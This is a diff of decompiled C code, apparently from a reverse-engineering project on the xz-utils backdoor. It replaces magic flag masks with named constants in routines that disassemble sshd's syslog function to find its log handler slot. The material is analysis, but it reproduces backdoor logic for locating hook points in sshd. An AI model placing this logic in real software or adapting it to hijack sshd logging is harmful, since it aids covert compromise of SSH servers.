@@ -625,12 +625,12 @@ LAB_001065af:
         }
         if ((syslog_dasm_ctx.opcode_window.opcode_window_dword & 0xfffffffd) == X86_OPCODE_1B_XOR_RM_R) {
           if (syslog_dasm_ctx.prefix.modrm_bytes.modrm_mod != '\x03') goto LAB_00106735;
-          if ((syslog_dasm_ctx.prefix.flags_u16 & 0x1040) == 0) {
-            if ((syslog_dasm_ctx.prefix.flags_u16 & 0x40) != 0) {
+          if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_MODRM_IMM64_MASK) == 0) {
+            if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_MODRM) != 0) {
               relr_retry_flag = 0;
 LAB_001067cf:
               mov_dst_reg = syslog_dasm_ctx.prefix.modrm_bytes.modrm_rm;
-              if ((syslog_dasm_ctx.prefix.flags_u16 & 0x20) != 0) {
+              if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_REX) != 0) {
                 mov_dst_reg = syslog_dasm_ctx.prefix.modrm_bytes.modrm_rm |
                          ((syslog_dasm_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
               }
@@ -639,17 +639,17 @@ LAB_001067cf:
             mov_dst_reg = 0;
           }
           else {
-            if ((syslog_dasm_ctx.prefix.flags_u16 & 0x40) != 0) {
+            if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_MODRM) != 0) {
               relr_retry_flag = syslog_dasm_ctx.prefix.modrm_bytes.modrm_reg;
-              if ((syslog_dasm_ctx.prefix.flags_u16 & 0x20) != 0) {
+              if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_REX) != 0) {
                 relr_retry_flag = relr_retry_flag | ((syslog_dasm_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1);
               }
               goto LAB_001067cf;
             }
             mov_dst_reg = syslog_dasm_ctx.prefix.decoded.flags2 & DF2_IMM64;
-            if ((syslog_dasm_ctx.prefix.flags_u16 & 0x1000) == 0) goto LAB_001067fb;
+            if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_IMM64) == 0) goto LAB_001067fb;
             relr_retry_flag = syslog_dasm_ctx.mov_imm_reg_index;
-            if ((syslog_dasm_ctx.prefix.flags_u16 & 0x20) != 0) {
+            if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_REX) != 0) {
               relr_retry_flag = syslog_dasm_ctx.mov_imm_reg_index |
                        ((syslog_dasm_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
             }
@@ -675,11 +675,11 @@ LAB_001067fb:
             probe_success = find_riprel_mov(scan_cursor,(u8 *)loader_data.sshd_string_refs.syslog_bad_level.
                                                    func_end,TRUE,FALSE,&probe_dasm_ctx);
             if (probe_success == FALSE) break;
-            if ((probe_dasm_ctx.prefix.flags_u16 & 0x1040) != 0) {
-              if ((probe_dasm_ctx.prefix.flags_u16 & 0x40) == 0) {
+            if ((probe_dasm_ctx.prefix.flags_u16 & DF16_MODRM_IMM64_MASK) != 0) {
+              if ((probe_dasm_ctx.prefix.flags_u16 & DF16_MODRM) == 0) {
                 mov_src_reg = probe_dasm_ctx.prefix.decoded.flags2 & DF2_IMM64;
-                if (((probe_dasm_ctx.prefix.flags_u16 & 0x1000) != 0) &&
-                   (mov_src_reg = probe_dasm_ctx.mov_imm_reg_index, (probe_dasm_ctx.prefix.flags_u16 & 0x20) != 0))
+                if (((probe_dasm_ctx.prefix.flags_u16 & DF16_IMM64) != 0) &&
+                   (mov_src_reg = probe_dasm_ctx.mov_imm_reg_index, (probe_dasm_ctx.prefix.flags_u16 & DF16_REX) != 0))
                 {
                   relr_retry_flag = (probe_dasm_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3;
                   goto LAB_001068e4;
@@ -687,7 +687,7 @@ LAB_001067fb:
               }
               else {
                 mov_src_reg = probe_dasm_ctx.prefix.modrm_bytes.modrm_reg;
-                if ((probe_dasm_ctx.prefix.flags_u16 & 0x20) != 0) {
+                if ((probe_dasm_ctx.prefix.flags_u16 & DF16_REX) != 0) {
                   relr_retry_flag = (probe_dasm_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1;
 LAB_001068e4:
                   mov_src_reg = mov_src_reg | relr_retry_flag & 8;
@@ -695,7 +695,7 @@ LAB_001068e4:
               }
             }
             main_data_base = log_handler_ctx_candidate;
-            if ((mov_dst_reg == mov_src_reg) && ((probe_dasm_ctx.prefix.flags_u16 & 0x100) != 0)) {
+            if ((mov_dst_reg == mov_src_reg) && ((probe_dasm_ctx.prefix.flags_u16 & DF16_MEM_DISP) != 0)) {
               log_handler_slot_tmp = (log_handler_fn *)probe_dasm_ctx.mem_disp;
               if (((uint)probe_dasm_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32) {
                 log_handler_slot_tmp = (log_handler_fn *)
@@ -776,10 +776,10 @@ LAB_00106b3c:
         }
         else if ((((syslog_dasm_ctx.opcode_window.opcode_window_dword == X86_OPCODE_1B_MOV_RM_IMM32) &&
                   ((uint)syslog_dasm_ctx.prefix.decoded.modrm >> 8 == 0x50000)) &&
-                 ((syslog_dasm_ctx.prefix.flags_u16 & 0x800) != 0)) && (syslog_dasm_ctx.imm_zeroextended == 0))
+                 ((syslog_dasm_ctx.prefix.flags_u16 & DF16_IMM) != 0)) && (syslog_dasm_ctx.imm_zeroextended == 0))
         {
           log_handler_slot_candidate = (log_handler_fn *)0x0;
-          if ((syslog_dasm_ctx.prefix.flags_u16 & 0x100) != 0) {
+          if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_MEM_DISP) != 0) {
             log_handler_slot_candidate = (log_handler_fn *)
                     (syslog_dasm_ctx.instruction + syslog_dasm_ctx.instruction_size + syslog_dasm_ctx.mem_disp);
           }
@@ -798,7 +798,7 @@ LAB_00106b3c:
                                  (scan_cursor,(u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_end
                                   ,&probe_dasm_ctx,X86_OPCODE_1B_MOV_RM_IMM32,(void *)0x0);
               if (probe_success == FALSE) break;
-              if ((probe_dasm_ctx.imm_zeroextended == 0) && ((probe_dasm_ctx.prefix.flags_u16 & 0x100) != 0))
+              if ((probe_dasm_ctx.imm_zeroextended == 0) && ((probe_dasm_ctx.prefix.flags_u16 & DF16_MEM_DISP) != 0))
               {
                 log_handler_ctx_candidate = (log_handler_fn *)probe_dasm_ctx.mem_disp;
                 if (((uint)probe_dasm_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32) {
